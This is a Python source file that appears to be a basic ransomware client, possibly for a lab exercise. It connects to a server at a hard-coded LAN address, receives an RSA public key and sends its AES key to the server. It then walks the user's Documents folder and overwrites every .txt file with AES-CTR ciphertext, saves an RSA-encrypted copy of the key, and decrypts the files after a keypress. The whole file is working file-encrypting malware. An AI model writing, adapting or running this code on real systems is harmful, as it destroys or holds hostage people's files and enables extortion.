import socket
import os
import string
import pyaes, pbkdf2, secrets
import rsa


def get_all_txt_files():
    """
    Get ALl txt Files from PC

    Returns
    _______
    List of Paths to txt files
    """

    root_dir = os.path.join(os.path.join(os.path.expanduser('~')), 'Documents')

    # Specify the file extension to search for
    extension = '.txt'

    # Initialize an empty list to store the file paths
    file_paths = []

    # Walk through all directories in the root directory
    for root, _, files in os.walk(root_dir):
        # Check each file in the current directory for the specified extension
        for file in files:
            if file.endswith(extension):
                print(os.path.join(root, file))
                file_paths.append(os.path.join(root, file))

    return file_paths


def generate_random_128bits_ascii():
    res = ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for x in range(16))
    # Print the Secure string with the combonation of letters, digits and punctuation
    print("Secure random string is : " + str(res))
    return res


def AES_Key():
    aes_key = bytes(generate_random_128bits_ascii(), 'ascii')
    # aes_key = os.urandom(16)
    # f = open("key.key", "wb")
    # f.write(aes_key)
    # f.close()
    return aes_key


def Encrypt_file(aes_key,path):
    file = open(path)
    text = file.readlines()
    text = ''.join(text)
    file.close()
    print(text)

    iv = 0

    # print(type(iv))
    aes = pyaes.AESModeOfOperationCTR(aes_key, pyaes.Counter(iv))
    ciphertext = aes.encrypt(text)
    y = open(path, "wb")
    y.write(ciphertext)
    y.close()


def AES_Key_Encrypt(pu, aes_key):
    aes_key_enc = rsa.encrypt(aes_key, pu)
    y = open("encryptedKey.key", "wb")
    y.write(aes_key_enc)
    y.close()


def Decrypt_File(aes_key,path):
    file = open(path, "rb")
    ciphertext = file.read()
    # ciphertext = ''.join(ciphertext)
    file.close()

    iv = 0
    # text=aes.d
    # print(type(iv))
    aes = pyaes.AESModeOfOperationCTR(aes_key, pyaes.Counter(iv))
    text = aes.decrypt(ciphertext)
    y = open(path, "wb")
    y.write(text)
    y.close()
    #


def savekey(file_name, parametertoput):
    save_path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')

    # name_of_file = input("What is the name of the file: ") if you want to always name the file
    name_of_file = file_name

    completeName = os.path.join(save_path, name_of_file + ".key")

    file1 = open(completeName, "wb")

    toFile = parametertoput

    file1.write(toFile)

    file1.close()


SERVER_IP = '192.168.1.14'
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    # Get Public Key
    public_key = s.recv(1024)
    public_key = rsa.PublicKey.load_pkcs1(public_key)
    print(public_key)
    # Generate AES key
    aes_key = AES_Key()
    print(aes_key)
    s.send(aes_key)
    # Encrypting Files
    files = get_all_txt_files()
    for file_path in files:
        print(f"Encrypting {file_path}")
        Encrypt_file(aes_key,file_path)

    # Encrypting AES Key
    encrypted_aes_key = AES_Key_Encrypt(public_key, aes_key)
    # print(data)

    input()
    s.send(b'Send key')
    decrypted_aes_key = s.recv(1024)
    for file_path in files:
        print(f"Decrypting {file_path}")
        Decrypt_File(aes_key,file_path)

